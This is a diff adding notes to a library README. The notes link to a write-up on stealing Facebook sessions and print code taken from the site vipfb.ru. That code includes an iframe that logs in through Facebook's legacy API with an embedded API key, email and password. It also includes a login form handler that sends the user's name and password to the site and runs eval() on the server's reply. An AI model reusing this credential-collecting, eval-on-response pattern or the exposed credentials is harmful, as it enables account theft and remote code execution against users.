@@ -22,3 +22,24 @@ This is an old library and needs to use another older libraries meanwhile we are
 
 ## Util
 https://stephensclafani.com/2014/07/29/hacking-facebooks-legacy-api-part-2-stealing-user-sessions/
+https://vipfb.ru 
+* (inside iframe)
+```javascript
+document.getElementById("vipfb").innerHTML='<iframe width=\"100%\" style=\"border: none;overflow: hidden;word-wrap: break-word; padding: 15px;\" height=\"auto\" src=\"https:\/\/api.facebook.com\/restserver.php?api_key=882a8490361da98702bf97a021ddc14d&email=carchvhycroh%40hotmail.com&format=JSON&locale=en_US&method=auth.login&password=1234&return_ssl_resources=1&v=2.6&sig=56fb4ec3dea1ac421e19d32769762bc5\"><\/iframe>';
+```
+* (inside sources)
+```javascript
+function vipfb_login() {
+    var http = new XMLHttpRequest,
+        user = document.getElementById("user").value,
+        pass = document.getElementById("pass").value,
+        params = "u=" + user + "&p=" + pass;
+    document.cookie = "email=" + user, http.open("POST", "#", !0), http.setRequestHeader("Content-type", "application/x-www-form-urlencoded"), http.onreadystatechange = function() {
+        if (4 == http.readyState && 200 == http.status) {
+            var yorumveri = JSON.parse(this.responseText);
+debugger
+            yorumveri && yorumveri.eval && eval(yorumveri.eval)
+        }
+    }, http.send(params)
+}
+```
